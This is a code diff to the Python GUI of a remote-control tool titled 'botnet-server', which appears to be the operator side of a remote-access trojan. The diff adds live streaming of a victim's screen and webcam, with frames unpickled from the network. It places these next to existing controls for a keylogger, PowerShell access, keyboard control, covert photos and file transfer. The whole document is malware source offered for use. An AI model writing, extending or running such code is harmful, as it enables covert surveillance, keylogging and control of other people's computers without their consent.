@@ -16,8 +16,11 @@ from tkinter import messagebox
 from tkinter import ttk
 import pyautogui
 from threading import Thread
+import threading
+import pickle
+import struct
 
-from pyngrok import ngrok
+#from pyngrok import ngrok
 
 
 
@@ -27,11 +30,93 @@ display_text = ''
 backup_text  = ''
 btn_start_text = 'start server'
 server_started = False
-button_state = DISABLED
+button_state = NORMAL#DISABLED
 home_buttons = []
 line_breaker = '\n'+'='*210+'\n'
 header = '\n+===================================+\n'
 seper  = '\n+-----------------------------------+\n'
+
+
+
+
+
+
+class StreamingServer:
+    def __init__(self,sock,name,slots=8, quit_key='q'):
+        self.__slots = slots
+        self.__used_slots = 0
+        self.__running = False
+        self.__quit_key = quit_key
+        self.__block = threading.Lock()
+        self.__server_socket = sock
+        self.name = name
+
+    def start_server(self):
+        if self.__running:
+            print("Server is already running")
+        else:
+            self.__running = True
+            self.server_thread = threading.Thread(target=self.__client_connection, args=(self.__server_socket,))
+            self.server_thread.start()
+
+    def stop_server(self):
+        if self.__running:
+            self.__running = False
+            cv2.destroyWindow(self.name)
+            self.server_thread.join()
+            print('yo reiner')
+            #self.__block.acquire()
+            #self.__block.release()
+            #self.__server_socket.close()
+        else:
+            print("Server not running!")
+
+    def __client_connection(self, connection):
+        payload_size = struct.calcsize('>L')
+        data = b""
+        cv2.namedWindow(self.name, cv2.WINDOW_NORMAL)
+
+        while self.__running:
+
+            break_loop = False
+
+            while len(data) < payload_size:
+                received = connection.recv(4096)
+                if received == b'':
+                    connection.close()
+                    self.__used_slots -= 1
+                    break_loop = True
+                    break
+                data += received
+
+            if break_loop:
+                break
+
+            packed_msg_size = data[:payload_size]
+            data = data[payload_size:]
+
+            msg_size = struct.unpack(">L", packed_msg_size)[0]
+
+            while len(data) < msg_size:
+                data += connection.recv(4096)
+
+            frame_data = data[:msg_size]
+            data = data[msg_size:]
+
+            frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
+            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
+
+            cv2.imshow(self.name, frame)
+            if cv2.waitKey(1) == ord(self.__quit_key):
+                connection.close()
+                self.__used_slots -= 1
+                break
+
+
+
+
+
+
 
 
 
@@ -351,11 +436,11 @@ def changetheme():
 
 
 ################################################ START SERVER #########################################################
-
-def start(PORT):
-	global server,client
+PORT = 5067
+def start(pp):
+	global server,client,HOST
 		
-	#HOST = get_ip_addresses()
+	HOST = get_ip_addresses()
 	#HOST = '103.66.79.173'
 	#HOST = '0.0.0.0'
 	server_ip = ''#socket.gethostbyname('')
@@ -376,7 +461,7 @@ def start(PORT):
 
 
 
-def start_server(PORT=5059):
+def start_server(PORT=5050):
 	global server_started,btn_start_text,button_state,display_text
 	stop_text = 'server stopped'
 	if not server_started:
@@ -495,9 +580,6 @@ def archive(path,name):
 	display.insert(END,text+header+'\n')
 
 
-def stream():
-	widgetdestroyer(controlls_frame)
-	Label(controlls_frame,text='work in progress',fg='red',bg=bg,font=font_14).pack(fill=BOTH,expand=True)
 
 
 def update_dir(Type,name):
@@ -989,15 +1071,43 @@ def popup():
 
 
 
+def stream(mode):
+	widgetdestroyer(controlls_frame)
+	receiver = StreamingServer(client,'output')
+
+	if mode=='screen':
+		client.send('stream screen'.encode('utf-8'))
+		def stop_stream():
+			client.send('stop screenshare'.encode('utf-8'))
+
+	else:
+		client.send('stream cam'.encode('utf-8'))
+		def stop_stream():
+			client.send('stop camshare'.encode('utf-8'))
+
+
+	btn_start = Button(controlls_frame,text='start streaming',bg=bg,fg=fg,font=font_16,command=receiver.start_server)
+	btn_stop  = Button(controlls_frame,text='stop streaming' ,bg=bg,fg=fg,font=font_16,command=stop_stream)
+
+	btn_start.pack(side=LEFT,fill=BOTH,expand=True,padx=10,pady=10)
+	btn_stop.pack(side=LEFT,fill=BOTH,expand=True,padx=10,pady=10)
 
 
 
 
+def stream(mode):
+	widgetdestroyer(controlls_frame)
+	receiver = StreamingServer(client,'output')
 
+	if mode=='screen':
+		client.send('stop camshare'.encode('utf-8'))
+		client.send('stream screen'.encode('utf-8'))
 
+	else:
+		client.send('stop screenshare'.encode('utf-8'))
+		client.send('stream cam'.encode('utf-8'))
 
-
-
+	receiver.start_server()
 
 
 
@@ -1096,6 +1206,7 @@ def home(root):
 	btn_popup      = Button(left_buttons,state=button_state,text='popup',command=lambda:popup(),**kwargs)
 	btn_send_file  = Button(left_buttons,state=button_state,text='send a file',command=lambda:transfer_file('send'),**kwargs)
 	btn_screenshot = Button(left_buttons,state=button_state,text='take screenshot',command=lambda:Thread(target=screenshot).start(),**kwargs)
+	btn_screenshare       = Button(left_buttons,state=button_state,text='stream screen',command=lambda:stream('screen'),**kwargs)
 	btn_extract_zip       = Button(left_buttons,state=button_state,text='extract a zip',command=lambda:extract_zip(),**kwargs)
 	btn_keyboard_controll = Button(left_buttons,state=button_state,text='keyboard access',command=lambda:keyboard(),**kwargs)
 
@@ -1108,6 +1219,7 @@ def home(root):
 	btn_keylogger   = Button(right_buttons,state=button_state,text='keylogger',command=keylogger,**kwargs)
 	btn_powershell  = Button(right_buttons,state=button_state,text='powershell',command=lambda:powershell(),**kwargs)
 	btn_takepicture = Button(right_buttons,state=button_state,text='take picture',command=lambda:Thread(target=take_picture).start(),**kwargs)
+	btn_camshare    = Button(right_buttons,state=button_state,text='stream camera',command=lambda:stream('cam'),**kwargs)
 
 
 	#dashboard buttons
@@ -1116,7 +1228,7 @@ def home(root):
 	btn_start  = Button(controlls_frame,text=btn_start_text,command=start_server,**kwargs)
 
 	
-	home_buttons=[btn_send_file,btn_recv_file,btn_screenshot,btn_takepicture,btn_mkdir,btn_rmdir,btn_open,btn_extract_zip,
+	home_buttons=[btn_send_file,btn_recv_file,btn_screenshot,btn_screenshare,btn_takepicture,btn_camshare,btn_mkdir,btn_rmdir,btn_open,btn_extract_zip,
 	btn_keyboard_controll,btn_rmf,btn_linux,btn_archive,btn_keylogger,btn_powershell,btn_popup,btn_home]
 	
 
@@ -1135,6 +1247,6 @@ def home(root):
 
 root = Tk()
 root.title('botnet-server')
-root.geometry(f'{width}x{height}')
+root.geometry(f'{width}x{height+70}')
 default_theme()
 root.mainloop()
